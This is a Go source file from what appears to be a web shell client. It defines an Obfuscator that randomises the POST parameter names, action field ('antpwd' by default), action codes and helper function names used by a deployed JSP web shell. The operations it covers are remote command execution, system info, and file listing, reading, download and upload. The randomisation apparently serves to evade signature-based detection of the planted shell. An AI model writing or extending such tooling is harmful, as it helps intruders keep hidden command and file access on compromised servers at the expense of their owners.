package jsp

import (
	"crypto/rand"
	"encoding/hex"
)

// Obfuscator manages per-shell obfuscation for JSP operations.
// Generated once per shell deployment; the same state is used by the
// deployed JSP shell and all client-side operations.
type Obfuscator struct {
	paramZ1      string            // POST field name for first data parameter
	paramZ2      string            // POST field name for second data parameter
	actionField  string            // POST field name carrying the action code
	actionCodes  map[string]string // logical operation name -> action code sent on wire
	helperDecode string            // base64 decode function name in the shell
	helperEncode string            // base64 encode function name in the shell
}

// NewObfuscator creates an Obfuscator with all randomized names.
func NewObfuscator() *Obfuscator {
	return &Obfuscator{
		paramZ1:      randParamName(),
		paramZ2:      randParamName(),
		actionField:  randParamName(),
		actionCodes:  randActionCodes(),
		helperDecode: "b" + randHexStr(4),
		helperEncode: "e" + randHexStr(4),
	}
}

// DefaultObfuscator returns an Obfuscator with standard (non-obfuscated) names.
func DefaultObfuscator() *Obfuscator {
	return &Obfuscator{
		paramZ1:      "z1",
		paramZ2:      "z2",
		actionField:  "antpwd",
		actionCodes:  defaultActionCodes(),
		helperDecode: "b",
		helperEncode: "e",
	}
}

// Param1 returns the obfuscated first data parameter field name.
func (o *Obfuscator) Param1() string {
	if o == nil {
		return "z1"
	}
	return o.paramZ1
}

// Param2 returns the obfuscated second data parameter field name.
func (o *Obfuscator) Param2() string {
	if o == nil {
		return "z2"
	}
	return o.paramZ2
}

// ActionField returns the obfuscated payload/action field name.
func (o *Obfuscator) ActionField() string {
	if o == nil {
		return "antpwd"
	}
	return o.actionField
}

// ActionCode returns the obfuscated action code for the given operation.
func (o *Obfuscator) ActionCode(opName string) string {
	if o == nil || o.actionCodes == nil {
		return defaultActionCode(opName)
	}
	if code, ok := o.actionCodes[opName]; ok {
		return code
	}
	return defaultActionCode(opName)
}

// HelperDecode returns the obfuscated base64-decode function name.
func (o *Obfuscator) HelperDecode() string {
	if o == nil || o.helperDecode == "" {
		return "b"
	}
	return o.helperDecode
}

// HelperEncode returns the obfuscated base64-encode function name.
func (o *Obfuscator) HelperEncode() string {
	if o == nil || o.helperEncode == "" {
		return "e"
	}
	return o.helperEncode
}

// randParamName generates a random 8-char hex POST field name.
func randParamName() string {
	buf := make([]byte, 4)
	_, _ = rand.Read(buf)
	return hex.EncodeToString(buf)
}

// randHexStr generates a random hex string of n bytes (2n hex chars).
func randHexStr(n int) string {
	buf := make([]byte, n)
	_, _ = rand.Read(buf)
	return hex.EncodeToString(buf)
}

// defaultActionCode returns the standard action code for an operation.
func defaultActionCode(opName string) string {
	switch opName {
	case "info":
		return actionInfo
	case "exec":
		return actionExec
	case "file.list":
		return actionFileList
	case "file.read":
		return actionFileRead
	case "file.download":
		return actionFileDown
	case "file.upload":
		return actionFileUp
	default:
		return opName
	}
}

// defaultActionCodes returns the standard action code map.
func defaultActionCodes() map[string]string {
	return map[string]string{
		"info":          actionInfo,
		"exec":          actionExec,
		"file.list":     actionFileList,
		"file.read":     actionFileRead,
		"file.download": actionFileDown,
		"file.upload":   actionFileUp,
	}
}

// randActionCodes generates random action codes for all operations.
func randActionCodes() map[string]string {
	return map[string]string{
		"info":          randHexStr(8),
		"exec":          randHexStr(8),
		"file.list":     randHexStr(8),
		"file.read":     randHexStr(8),
		"file.download": randHexStr(8),
		"file.upload":   randHexStr(8),
	}
}

// SetParam1 overrides the first parameter field name.
func (o *Obfuscator) SetParam1(name string) *Obfuscator {
	o.paramZ1 = name
	return o
}

// SetParam2 overrides the second parameter field name.
func (o *Obfuscator) SetParam2(name string) *Obfuscator {
	o.paramZ2 = name
	return o
}

// SetActionField overrides the action POST field name.
func (o *Obfuscator) SetActionField(name string) *Obfuscator {
	o.actionField = name
	return o
}

// SetActionCode overrides the action code for a specific operation.
func (o *Obfuscator) SetActionCode(opName, code string) *Obfuscator {
	if o.actionCodes == nil {
		o.actionCodes = make(map[string]string)
	}
	o.actionCodes[opName] = code
	return o
}

// Copy returns a standalone copy of the Obfuscator.
func (o *Obfuscator) Copy() *Obfuscator {
	if o == nil {
		return nil
	}
	codes := make(map[string]string, len(o.actionCodes))
	for k, v := range o.actionCodes {
		codes[k] = v
	}
	return &Obfuscator{
		paramZ1:      o.paramZ1,
		paramZ2:      o.paramZ2,
		actionField:  o.actionField,
		actionCodes:  codes,
		helperDecode: o.helperDecode,
		helperEncode: o.helperEncode,
	}
}
